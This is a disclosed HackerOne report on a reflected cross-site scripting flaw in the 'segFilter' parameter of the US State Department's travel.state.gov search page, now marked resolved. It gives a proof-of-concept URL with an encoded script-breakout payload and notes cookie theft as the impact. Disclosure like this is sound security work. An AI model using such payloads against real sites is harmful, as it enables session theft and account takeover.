---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1818628'
original_report_id: '1818628'
title: RXSS on https://travel.state.gov/content/travel/en/search.html
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: us-department-of-state
created_at: '2022-12-29T17:49:03.654Z'
disclosed_at: '2023-03-08T01:59:30.205Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 28
asset_identifier: '*.STATE.GOV'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# RXSS on https://travel.state.gov/content/travel/en/search.html

## Metadata

- HackerOne Report ID: 1818628
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: us-department-of-state
- Disclosed At: 2023-03-08T01:59:30.205Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hello team,
I Found RXSS via `segFilter` parameter on url : `https://travel.state.gov/content/travel/en/search.html/?search_input=hello&data-sia=false&data-con=false&search_btn=&segFilter=x%27%29%3bconfirm%28%271`
Open url, you will see an alert box pop up:

{F2096019}

## Impact

Steal session cookies to account takeovers
execute JS code

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
